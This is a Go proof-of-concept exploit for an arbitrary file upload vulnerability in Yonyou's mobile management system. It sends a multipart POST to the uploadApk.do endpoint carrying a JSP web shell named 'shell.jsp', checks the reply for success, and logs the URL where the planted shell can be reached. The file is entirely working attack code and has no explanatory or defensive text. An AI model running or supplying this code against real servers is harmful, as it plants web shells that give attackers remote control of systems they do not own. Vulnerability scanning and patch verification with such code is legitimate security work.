package poc

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func UploadApk(target string) {
	url := strings.TrimRight(target, "/")
	filePath := "shell.jsp"

	bodyBuf := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuf)

	fileWriter, err := bodyWriter.CreateFormFile("downloadpath", filePath)
	if err != nil {
		fmt.Println("error writing to buffer")
	}

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("error opening file")
	}
	defer file.Close()

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		fmt.Println("error copying file")
	}

	contentType := bodyWriter.FormDataContentType()
	bodyWriter.Close()

	req, err := http.NewRequest("POST", url+"/maportal/appmanager/uploadApk.do?pk_obj=", bodyBuf)
	if err != nil {
		fmt.Println("error creating request")
	}

	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Cookie", "JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server")
	req.Header.Set("Connection", "close")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("error sending request")
	}
	body, _ := io.ReadAll(resp.Body)
	defer resp.Body.Close()
	tag := regexp.MustCompile(`\{"status":2\}`).MatchString(string(body))
	if resp.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在用友-移动管理系统 uploadApk.do 任意文件上传漏洞")
		log.Println("[+] shell：" + url + "/maupload/apk/" + filePath)
	} else {
		log.Println("[-] 不存在用友-移动管理系统 uploadApk.do 任意文件上传漏洞")
	}
}
